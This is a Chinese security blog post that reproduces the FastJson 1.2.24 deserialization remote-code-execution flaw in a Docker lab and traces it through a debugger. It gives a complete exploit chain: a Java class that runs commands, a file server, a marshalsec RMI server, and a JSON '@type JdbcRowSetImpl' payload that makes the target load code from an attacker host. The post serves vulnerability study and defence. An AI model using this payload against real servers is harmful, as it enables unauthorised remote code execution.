# FastJson_1.2.24 反序列化漏洞复现+解析

阅读量 **214468**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-08 17:30:23

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t018e56c1e219adae7d.png)

概述：本文从复现与调试分析两个方向简述了此漏洞，逐步跟踪漏洞执行流程。  
漏洞的复现与调试分析采用了两套环境  
复现：Windows+WSL_Ubuntu18.04+Vulhub  
调试分析：Windows+IDEA+WSL_Ubuntu18.04

## 漏洞复现

###  使用VulHub-Docker 环境

采用 VulHub 中的FastJson 1.2.24-RCE 集成式Docker环境

此处需要用到一些其他知识：

  * [git 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199137?spm=1001.2014.3001.5501 "git 基础命令")
  * [docker/docker-compose 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199173?spm=1001.2014.3001.5501 "docker/docker-compose 基础命令")
  * [curl 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199232?spm=1001.2014.3001.5501 "curl 基础命令")

VulHub 下载命令：

  * `GitHub：git clone https://github.com/vulhub/vulhub.git`
  * `Gitee：git clone https://gitee.com/Plastilina/vulhub.git`

下载完成后进入相关漏洞环境目录  
此处为：`/vulhub/fastjson/1.2.24-rce`  
目录下具有`docker-compose.yml`文件，为`docker compose`的配置文件，通过此文件构建一个具有`FastJson
1.2.24-RCE`漏洞的`Docker`容器  
构建命令：`docker-compose build`  
启动命令：`docker-compose up -d`  
停止命令：`docker-compose down`  
进入docker容器命令：

  * 使用`docker ps`获取对应容器的`CONTAINER ID`  

  * 进入docker容器  
`docker exec -it <CONTAINER ID> /bin/bash`

检测是否正常使用：在本机运行`curl http://127.0.0.1：8090`  
出现下图信息，表示正常运行：

![](https://p1.ssl.qhimg.com/t016da58d492c9a1fde.png)

###  构建恶意访问请求Payload

注意：此文件构建在另一主机上

此处需要使用到的其他知识：

  * [javac 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199335?spm=1001.2014.3001.5501 "javac 基础命令")

创建`TouchFile.java`文件  
拷贝如下代码

    
    
    // javac TouchFile.java
    import java.lang.Runtime;
    import java.lang.Process;
    
    public class TouchFile {
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/success"};
                # Windows
                # String[] commands = {"notepad.exe"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    }
    

执行编译命令，生成class文件  
`javac TouchFile.java`

###  使用python 创建简易文件服务器

注意：此文件服务器不与目标机同一机器上

命令行模式下`cd`到构建了恶意payload文件目录下  
执行命令：`python -m http.server [port]`

例：`python -m http.server 1111`  
出现下图所示表示成功：

![](https://p5.ssl.qhimg.com/t0128eadee9bf6edf96.png)

此时在目标主机应该可以访问到此目录下的文件  
在目标主机执行命令  
`curl http://<存放了payload主机的IP>:1111`

返回的数据中应有如下类似数据

![](https://p0.ssl.qhimg.com/t01f3e6276dbcca2571.png)

###  使用marshalsec 创建恶意RMI服务

注意：此RMI服务不在目标主机上，在搭建了文件服务器的主机上。  
（当然，它也可以在其他机器中，只要各个机器可以互相访问）

**RMI:** Remote Method Invocation，远程方法调用。RMI服务器类似以前的电话转接员，用于转接服务器的特定请求。

此处需要用到一些其他知识：

  * [java 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199335?spm=1001.2014.3001.5501 "java 基础命令")
  * [maven 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199478?spm=1001.2014.3001.5501 "maven 基础命令")

下载`marshalsec`  
`Github:git clone https://github.com/mbechler/marshalsec.git`  
`Gitee:git clone https://gitee.com/Plastilina/marshalsec.git`

下载完成后进入`marshalsec`目录，其中有一个`pom.xml`文件，这是一个`maven`的项目构建文件

![](https://p1.ssl.qhimg.com/t017a8a39b0bdec7237.png)

使用`maven`构建项目：`mvn compile`  
构建完成后，在该目录下会有一个`target`目录，内含构建好的jar包  
我们需要使用的为`marshalsec-0.0.3-SNAPSHOT-all.jar`

也可以直接下载编译完成的jar包  
链接：`Gitee: git clone https://gitee.com/Plastilina/marshalsec-jar.git`

然后进入jar包所在文件执行命令：  
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
<"文件服务器地址:端口/TouchFile"> <监听端口>`

例：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
"http://192.168.192.113:8000" 9999`

###  攻击

注：下列操作皆在恶意主机中执行。

启动`BurpSuite`,创建一个`Repeader`,host、端口指向目标机，当然也可以直接使用`Curl`  
拷贝如下代码：

    
    
    # BurpSuite
    POST / HTTP/1.1
    Host: 目标机器:8090
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 160
    
    {
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://恶意主机IP:9999/TouchFile",
            "autoCommit":true
        }
    }
    
    # Curl
    curl <目标主机IP>:<端口>/user -H "Content-Type:application/json" -d '{"b":{"@type":"com.sn.rowset.JdbcRowSetImpl","dataSourceName":"rmi://<文件服务器ip>:<端口>/TouchFile","autoCommit":true}}'
    

发送请求  
如果成功将有如下表现

  1. 文件服务器将出现如下记录。这是来自目标服务器的访问（RMI将你的数据信息告诉了目标服务器）  
  
如果此处未出现任何记录，请检查目标主机与恶意主机是否可以互相ping通，其次请检查，RMI服务是否注册绑定文件服务器（注意在绑定时，填写的恶意主机IP不能是本地回环地址，这是要发送到目标主机的数据）

  2. 如果RMI服务出现如下记录。这是来自目标服务器的访问，他将告诉目标主机去哪里获取它想要的文件数据。  
  
如果此处未出现任何记录，请检查目标主机与恶意主机之间是否可以互相访问（ping）。其次检查请求包`dataSourceName`字段是否填写正确。

  3. 目标docker容器执了命令，这里是在`tmp`目录下创建了`success`文件  

## 漏洞分析

###  IDEA构建调试环境

为了方便分析调试和追踪恶意数据，便不使用`vulhub`集成环境了。  
代码链接：[Link](https://gitee.com/Plastilina/fast-json-demo.git)  
JDK版本：[8u102](https://download.oracle.com/otn/java/jdk/8u102-b14/jdk-8u102-linux-x64.tar.gz?AuthParam=1619161090_9918e544f4ca929b58d65fba32af65c9
"8u102")，默认开启`com.sun.jndi.rmi.object.trustURLCodebase`

**调试执行**

  1. 调试启动服务端  
使用`IDEA`调试启动服务端，指定监听端口可在`src/main/resources/application.properties`目录下修改。

  2. 构建payload触发漏洞  
使用`curl`发送`payload`  
`curl <服务端ip>:<端口号>/user -H "Content-Type:application/json" -d
'{"b":{"[@type](https://github.com/type
"@type")":"com.sn.rowset.JdbcRowSetImpl","dataSourceName":"rmi://<恶意文件服务器主机ip>:<端口号>/TouchFile","autoCommit":true}}'`

###  漏洞分析

**观察异常堆栈**

当恶意代码执行完毕后，由于后续的状态的校验没有通过，会触发异常，返回调用堆栈。(请启用断点中的异常断点)

截取主要部分  
整个堆栈大致可以分为两部分

  1. 1-7行，为`JdbcRowSetImpl`中反射调用利用链流程。
  2. 8-末，为`FastJson`中的反序列化处理流程。

    
    
    java.sql.SQLException: JdbcRowSet (连接) JNDI 无法连接
            at com.sun.rowset.JdbcRowSetImpl.connect(Unknown Source) ~[na:1.8.0_102]
            at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(Unknown Source) ~[na:1.8.0_102]
            at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_102]
            at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_102]
            at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_102]
            at java.lang.reflect.Method.invoke(Unknown Source) ~[na:1.8.0_102]
            at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:96) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:593) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_2_JdbcRowSetImpl.deserialze(Unknown Source) ~[na:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parseExtra(DefaultJSONParser.java:1490) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:766) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_User.deserialze(Unknown Source) ~[na:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:339) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:307) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:270) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:370) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:452) ~[fastjson-1.2.24.jar!/:na]
    

**流程跟踪**

#### 针对`JdbcRowSetImpl`中反射调用利用链流程跟踪。

在`Method.invoke`处设置断点，发送`Payload`触发断点。  
可以看见`setAutoCommit`方法被调用了，这也就是`Payload`中设置`AutoCommit:false`的原因（其实`true/false`无所谓，只是为了触发反射调用。）

![](https://p1.ssl.qhimg.com/t012d5a7bfa8eebdb4d.png)

随后进入`setAutoCommit`源码，发现调用了`connect`,继续跟进。

![](https://p4.ssl.qhimg.com/t0143ba3fee087533bd.png)

跟进后发现了JNDI初始化流程，而这里的`getDataSourceName`,返回的便是我们`Payload`中`DataSouceName`。  
`lookup`中的参数可控，就和`exec`参数可控一样，具有很高的危险性。  
至此，通过`RMI`协议加载并实例化远程类，触发构造方法、静态方法等等，达到了攻击的目的。

![](https://p4.ssl.qhimg.com/t0155d3bac129137320.png)

#### 针对`FastJson`中的反序列化处理流程跟踪。

**JSON.parseObject**  
`JSON.parseObject`主要做了这么几件事

  * 将输入的byte字节数组转为String  

  * 创建并初始化`DefaultJSONParer`解析器  

  * 使用解析器解析输入流  

**DefaultJSONParser.parseObject**  
`JSON.parseObject`主要做了这么几件事

  * 创建`User`类的序列化器  

  * 使用序列化器反序列化  

**JavaBeanDeserializer.deserialze**  
这里的`JavaBeanDeserializer.deserialze`对应着上面的序列化器  
采用了`JAVA`的`ASM`技术动态的生成了类，并使用其创建了序列化器。  
其主要做了一下几件事

  * 遍历`JSON`字符串,查看是否有对应的字段，有则填充  

  * 当并未在字符串中扫描到对应的字段时，流程会走向`JavaBeanDeserializer.parseField`  

**JavaBeanDeserializer.parseField**  
`JavaBeanDeserializer.parseField`内会做如下几件事

  * 调用`smartMatch`,尝试从已有的`FieldDeserializers`中匹配字段反序列化器  

  * 当没有匹配到对应的反序列化器时，流程走向`DefaultJSONParser.parseExtra`  
而`parseExtra`内会匹配`extraTypeProviders`，匹配失败的话流程走向`DefaultJSONParser.parse`  

**DefaultJSONParser.parse**  
`DefaultJSONParser.parse`内会做如下几件事

  * 根据`lexer`选择执行流程，`lexer`在最开始初始化`DefaultJSONParer`内完成。  
这里的`LBRACE`对应着字符`{`。然后调用`DefaultJSONParer.parseObject`一个重载再次解析。  

 **DefaultJSONParer.parseObject**  
重点来了，流程如下

  1. 解析`JSON`格式的`payload`,扫描到`[@type](https://github.com/type "@type")`字段后，使用类加载器加载对应的类`JdbcRowSetImpl`  

  2. 获取`JdbcRowSetImpl`的序列化器进行反序列化  

  3. 在反序列化时，通过反射调用触发漏洞。  

## 漏洞总结

关于反序列系列的漏洞，我们通常关注的两个点：

  * 反序列化链
  * 反序列化链的利用

如前边所展现的`com.sn.rowset.JdbcRowSetImpl`便是一条反序列化链，通过设置`dataSourceName`与`autoCommit`属性，达到加载恶意类文件目的。  
类似的利用链还有`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

而接下来的`FastJson`一系列的调用，便是对反序列化的链的一个利用。  
可以发现，在首次反序列化失败后，流程会扫描传入的`JSON`字符串，并根据`[@type](https://github.com/type
"@type")`字段的值进行指定类型的构造，这也是此次漏洞主要的点。

在`FastJson`更高版本上便是增加了对`[@type](https://github.com/type "@type")`类型进行了一系列的检查过滤。

### 参考

[fastjson历史漏洞研究（一）](http://blog.topsec.com.cn/fastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89/)  
[基于Java反序列化RCE – 搞懂RMI、JRMP、JNDI](https://xz.aliyun.com/t/7079)  
[Fastjson 流程分析及 RCE 分析](https://paper.seebug.org/994/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Plastilina** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/239867](/post/id/239867)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [反序列化](/tag/反序列化)
  * [fastjson](/tag/fastjson)

 **+1** __1赞

 __收藏

![](https://p5.ssl.qhimg.com/t010305a377183b222f.png) Plastilina

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

